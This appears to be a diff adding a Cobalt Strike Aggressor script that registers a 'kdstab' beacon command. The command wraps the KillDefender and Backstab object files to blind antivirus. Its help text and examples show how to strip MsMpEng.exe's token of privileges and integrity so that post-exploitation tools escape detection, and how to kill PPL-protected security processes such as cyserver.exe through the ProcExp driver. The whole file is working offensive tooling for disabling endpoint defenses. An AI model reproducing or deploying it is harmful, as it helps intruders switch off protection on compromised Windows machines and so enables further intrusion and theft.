@@ -1,0 +1,225 @@
+# subroutine to parse options for script.
+# Returns options as a hash
+sub ops {
+	local('$count');
+	$count = 0;
+	%arguments = ohash();
+	foreach $arg ($1) {
+		if ($count > 0) {
+			if ($arg ismatch '/.*:.*') {
+				$arg = replace($arg, '\A/',"");
+				($key $val) = split(":", $arg, 2);
+				%arguments[$key] = $val;
+			}
+			else if ($arg ismatch '/.*') {
+				$arg = replace($arg, '\A/',"");
+				%arguments[$arg] = "TRUE";
+			}
+			else {
+				%arguments["$count"] = $arg;
+			}
+		}
+		$count = $count + 1;
+	}
+	return (%arguments);
+}
+
+beacon_command_register(
+	"kdstab",
+	"Check a processes token integrity
+	 Strip a processes token of all privileges and set integrity to untrusted
+	 List a PPL protected processes handles
+	 Kill a specific handle to a PPL protected process
+	 Kill a PPL protected process",
+	"
+Command: kdstab
+Summary: This command allows an operator to manipulate process tokens and kill PPL protected processes.
+
+Credits:
+	Original tools:
+		KillDefender by pwn1sher
+		Backstab by Yaxser
+	BOF examples + templates:
+		CS-Situational-Awareness-BOF by trustedsec
+
+Usage: kdstab </NAME:processname.exe || /PID:processpid> Action [options]
+	/NAME,             Choose process by name, including the .exe suffix
+	/PID,              Choose process by PID
+        
+	Actions:
+
+	/CHECK,		 Check the token integrity of a specified process to see if it has been stripped already
+	/STRIP,		 Strip all privileges from a processes token and set it's integrity to untrusted, rendering it blind
+	/KILL,             Kill the protected process by closing its handles
+	/LIST,             List handles of protected process
+	/CLOSE,            Close a specific handle
+
+	Options(For use ONLY with /KILL||/LIST||/CLOSE):
+
+	/DRIVER,           Specify path to where ProcExp will be extracted
+	/SERVICE,          Specify service name registry key
+	/UNLOAD,           (attempt to) Unload ProcExp driver
+
+Notes:
+	Obvious usage is to /STRIP MsMpEng.exe of privileges so that post-ex tools may be ran/dropped to disk without worry of AV picking them up.
+	After cleanup, /KILL MsMpEng.exe so that WinDefend service restarts it, restoring full functionality.
+
+	You MUST specify either /NAME || /PID
+	You MUST specify ONE of /CHECK || /STRIP || /KILL || /LIST || /CLOSE
+	You MAY specify none || either || both /DRIVER,/SERVICE only when using /KILL || /LIST || /CLOSE
+	Options /NAME, /PID, /CLOSE, /DRIVER, /SERVICE require an argument in format /NAME:argument
+
+Examples:
+	kdstab /NAME:MsMpEng.exe /CHECK					[check the token integrity of MsMpEng.exe to see if it has been stripped previously]
+	kdstab /NAME:MsMpEng.exe /STRIP					[strip all privileges from MsMpEng.exe and set it's token to Untrusted]
+	kdstab /NAME:MsMpEng.exe /KILL         				[kill the MsMpEng.exe process.  WinDefend service should automatically restart, restoring token privileges and integrity.]
+	kdstab /NAME:cyserver.exe /CLOSE:E4C       				[Close handle E4C of cyserver]
+	kdstab /NAME:cyserver.exe /LIST        	 			[list all handles of cyserver]
+	kdstab /PID:4326 /KILL /DRIVER:c:\\driver.sys /SERVICE:MyService    	[kill protected process with PID 4326, name service in registry MyService, extract ProcExp driver to C:\\driver.sys]
+"
+);
+
+alias kdstab {
+	local('$barch $handle $data $args $action $name $pid $listh $killproc $closeh $driverpath $servicename $unloaddriver %params');
+
+	#Check to make sure beacon is Admin or System
+	$username = beacon_info($1, "user");
+	if("*" isin $username)
+	{}
+	else
+	{
+		berror($1, "You need Admin or System privileges in order to run this command!");
+		exit();
+	}
+	
+	#Check for minimum # required args
+	if(size(@_) < 3)
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("kdstab"));
+		return;
+	}
+	
+	#Figure out the arch of this session
+	$barch  = barch($1);
+	if($barch ne "x64")
+	{
+		berror($1, "Only x64 is supported... sorry");
+		return;
+	}
+	
+	#Initialize vars
+	$action = "";
+	$name = "";
+	$pid = "";
+	$killproc = 0;
+	$listh = 0;
+	$closeh = "";
+	$driverpath = "";
+	$servicename = "";
+	$unloaddriver = 0;
+	%params = ops(@_);
+	@keys = keys(%params);
+	
+	#First logic check to make sure only one STRIP||CHECK used
+	if(("STRIP" in @keys)&&("CHECK" in @keys))
+	{
+		berror($1, "1");
+		#berror($1, beacon_command_detail("kdstab"));
+		return;
+	}
+	
+	if("NAME" in @keys) { $name = %params["NAME"]; }
+	if("PID" in @keys) { $pid = %params["PID"]; }
+	if("STRIP" in @keys) {$action = "strip"; }
+	if("CHECK" in @keys) {$action = "check"; }
+	if("KILL" in @keys) {$killproc = 1; }
+	if("LIST" in @keys) {$listh = 1; }
+	if("CLOSE" in @keys) { $closeh = %params["CLOSE"]; }
+	if("DRIVER" in @keys) { $driverpath = %params["DRIVER"]; }
+	if("SERVICE" in @keys) { $servicename = %params["SERVICE"]; }
+	if("UNLOAD" in @keys) {$unloaddriver = 1; }
+	
+	#Additional logic checks
+	
+	#Only 1 of name/pid allowed and one of them must be used
+	if((($name ne "")&&($pid ne ""))||(($name eq "")&&($pid eq "")))
+	{
+		berror($1, beacon_command_detail("kdstab"));
+		return;
+	}
+	
+	#If STRIP or CHECK were used, disallow use of KILL||LIST||CLOSE||DRIVER||SERVICE||UNLOAD
+	if(($action ne "")&&(($killproc != 0)||($listh != 0)||($closeh ne "")||($driverpath ne "")||($servicename ne "")||($unloaddriver != 0)))
+	{
+		berror($1, beacon_command_detail("kdstab"));
+		return;
+	}	
+	
+	#Only 1 of KILL||CLOSE||LIST may be used
+	if((($killproc != 0)&&($listh != 0)&&($closeh ne ""))||(($killproc != 0)&&($listh != 0))||(($killproc != 0)&&($closeh ne ""))||(($listh != 0)&&($closeh ne ""))||(($action eq "")&&($killproc == 0)&&($listh == 0)&&($closeh eq "")))
+	{
+		berror($1, beacon_command_detail("kdstab"));
+		return;
+	}
+	
+	#Some error handling.  Prevent people from passing args in using /NAME MsMpEng.exe instead of intended /NAME:MsMpEng.exe
+	if(($name eq "TRUE")||($pid eq "TRUE")||($closeh eq "TRUE")||($driverpath eq "TRUE")||($servicename eq "TRUE"))
+	{	
+		berror($1, beacon_command_detail("kdstab"));
+		return;
+	}
+	
+	
+	#If STRIP||CHECK used, we are using the KillDefender BOF
+	if($action ne "")
+	{
+		# read in the right BOF file
+		$handle = openf(script_resource("KillDefender. $+ $barch $+ .o"));
+		$data   = readb($handle, -1);
+		closef($handle);
+
+		# pack our arguments
+		$args   = bof_pack($1, "zzz", $action, $name, $pid);
+
+		# announce what we're doing
+		if($action eq "strip")
+		{
+			btask($1, "Stripping " . $name . $pid . " of token privileges and integrity...");
+		}
+		else
+		{
+			btask($1, "Checking integrity of " . $name . $pid . " ...");
+		}
+		
+		# execute it.
+		beacon_inline_execute($1, $data, "go", $args);
+	}
+	else
+	{
+		# read in the right BOF file
+		$handle = openf(script_resource("backstab. $+ $barch $+ .o"));
+		$data   = readb($handle, -1);
+		closef($handle);
+		
+		# pack our arguments
+		$args = bof_pack($1, "zzsszZZs", $name, $pid, $killproc, $listh, $closeh, $driverpath, $servicename, $unloaddriver);
+		
+		# announce what we're doing
+		if($killproc != 0)
+		{
+			btask($1, "Killing " . $name . $pid . " ...");
+		}
+		else if ($listh != 0)
+		{
+			btask($1, "Listing handles in " . $name . $pid . " ...");
+		}
+		else
+		{
+			btask($1, "Closing handle " . $closeh . " in " . $name . $pid . " ...");
+		}
+
+		# execute it.
+		beacon_inline_execute($1, $data, "go", $args);
+	}
+}
